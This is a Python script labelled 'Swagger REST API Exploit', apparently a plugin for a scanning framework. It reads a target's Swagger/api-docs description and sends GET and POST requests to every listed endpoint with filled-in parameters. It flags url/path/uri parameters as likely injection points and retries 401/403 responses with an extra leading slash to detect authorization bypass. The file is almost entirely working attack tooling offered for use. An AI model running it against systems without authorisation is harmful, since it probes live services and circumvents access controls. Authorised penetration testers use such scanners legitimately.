#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# Swagger REST API Exploit
# By LiJieJie my[at]lijiejie.com

import requests
import json
import time
from urllib.parse import urlparse
from ClassCongregation import color

requests.packages.urllib3.disable_warnings()
api_set_list = []    # ALL API SET
scheme = 'http'    # default value
headers = {'User-Agent': 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'}
auth_bypass_detected = False


def print_msg(msg, colors='black'):
    _msg = '[%s] %s' % (time.strftime('%H:%M:%S', time.localtime()), msg)
    color(_msg, colors)
    #print(_msg)


def find_all_api_set(start_url):
    try:
        text = requests.get(start_url, headers=headers, verify=False).text
        if text.strip().startswith('{"swagger":"'):    # from swagger.json
            api_set_list.append(start_url)
            print_msg('[OK] [API set] %s' % start_url)
            with open('./data/api-docs.json', 'w', encoding='utf-8') as f:
                f.write(text)
        elif text.find('"swaggerVersion"') > 0:    # from /swagger-resources/
            base_url = start_url[:start_url.find('/swagger-resources')]
            json_doc = json.loads(text)
            for item in json_doc:
                url = base_url + item['location']
                find_all_api_set(url)
        else:
            print_msg('[FAIL] Invalid API Doc: %s' % start_url)
    except Exception as e:
        print_msg('[find_all_api_set] process error %s' % e)


def process_doc(url):
    try:
        json_doc = requests.get(url, headers=headers, verify=False).json()
        base_url = scheme + '://' + json_doc['host'] + json_doc['basePath']
        base_url = base_url.rstrip('/')
        for path in json_doc['paths']:

            for method in json_doc['paths'][path]:
                if method.upper() not in ['GET', 'POST', 'PUT']:
                    continue

                params_str = ''
                sensitive_words = ['url', 'path', 'uri']
                sensitive_params = []
                if 'parameters' in json_doc['paths'][path][method]:
                    parameters = json_doc['paths'][path][method]['parameters']

                    for parameter in parameters:
                        para_name = parameter['name']
                        # mark sensitive parma
                        for word in sensitive_words:
                            if para_name.lower().find(word) >= 0:
                                sensitive_params.append(para_name)
                                break

                        if 'format' in parameter:
                            para_format = parameter['format']
                        elif 'schema' in parameter and 'format' in parameter['schema']:
                            para_format = parameter['schema']['format']
                        elif 'schema' in parameter and 'type' in parameter['schema']:
                            para_format = parameter['schema']['type']
                        elif 'schema' in parameter and '$ref' in parameter['schema']:
                            para_format = parameter['schema']['$ref']
                            para_format = para_format.replace('#/definitions/', '')
                            para_format = '{OBJECT_%s}' % para_format
                        else:
                            para_format = parameter['type'] if 'type' in parameter else 'unkonwn'

                        is_required = '' if parameter['required'] else '*'
                        params_str += '&%s=%s%s%s' % (para_name, is_required, para_format, is_required)
                    params_str = params_str.strip('&')
                    if sensitive_params:
                        print_msg('[*] Possible vulnerable param found: %s, path is %s' % (
                            sensitive_params, base_url+path), 'green')

                scan_api(method, base_url, path, params_str)
    except Exception as e:
        print_msg('[process_doc error][%s] %s' % (url, e))


def scan_api(method, base_url, path, params_str, error_code=None):
    # place holder
    _params_str = params_str.replace('*string*', 'a')
    _params_str = _params_str.replace('*int64*', '1')
    _params_str = _params_str.replace('*int32*', '1')
    _params_str = _params_str.replace('=string', '=test')
    _params_str = _params_str.replace('*number*', '1')
    _params_str = _params_str.replace('*date-time*', '20211104')
    _params_str = _params_str.replace('*boolean*', 'false')
    
    api_url = base_url + path
    # url黑名单
    sensitive_url = ['delete']
    for url in sensitive_url:
        if api_url.lower().find(url) >= 0:
            print_msg('[Continue] %s' % (api_url))
            return
    if not error_code:
        print_msg('[%s] %s %s' % (method.upper(), api_url, params_str))
    if method.upper() == 'GET':
        r = requests.get(api_url + '?' + _params_str, headers=headers, verify=False)
        if not error_code:
            if r.status_code == 200:
                print_msg('[Request] %s %s' % (method.upper(), api_url + '?' + _params_str), 'green')
            else:
                print_msg('[Request] %s %s' % (method.upper(), api_url + '?' + _params_str), 'red')
    else:
        r = requests.post(api_url, data=_params_str, headers=headers, verify=False)
        if not error_code:
            if r.status_code == 200:
                print_msg('[Request] %s %s \n%s' % (method.upper(), api_url, _params_str), 'green')
            else:
                print_msg('[Request] %s %s \n%s' % (method.upper(), api_url, _params_str), 'red')

    content_type = r.headers['content-type'] if 'content-type' in r.headers else ''
    content_length = r.headers['content-length'] if 'content-length' in r.headers else ''
    if not content_length:
        content_length = len(r.content)
    if not error_code:
        print_msg('[Response] Code: %s Content-Type: %s Content-Length: %s' % (
            r.status_code, content_type, content_length))
    else:
        #if r.status_code not in [401, 403, 500] or r.status_code != error_code:
        if r.status_code not in [401, 403]:
            global auth_bypass_detected
            auth_bypass_detected = True
            print_msg('[VUL] *** URL Auth Bypass ***')
            if method.upper() == 'GET':
                print_msg('[BypassRequest] [%s] %s Code: %s' % (method.upper(), api_url + '?' + _params_str, r.status_code), 'blue')
            else:
                print_msg('[BypassRequest] [%s] %s \n%s Code: %s' % (method.upper(), api_url, _params_str, r.status_code), 'blue')

    # Auth Bypass Test, 401,403 bypass
    if not error_code and r.status_code in [401, 403]:
        path = '/' + path
        scan_api(method, base_url, path, params_str, error_code=r.status_code)


print('[*] 请输入api-docs.json地址, 将自动对所有接口进行测试!!!')
def check(**kwargs):
    global api_set_list
    api_set_list.clear()
    try:
        _scheme = urlparse(kwargs['url']).scheme.lower()
        if _scheme.lower() == 'https':
            global scheme
            scheme = 'https'
        find_all_api_set(kwargs['url'])
        for url in api_set_list:
            process_doc(url)
    except Exception as e:
        pass

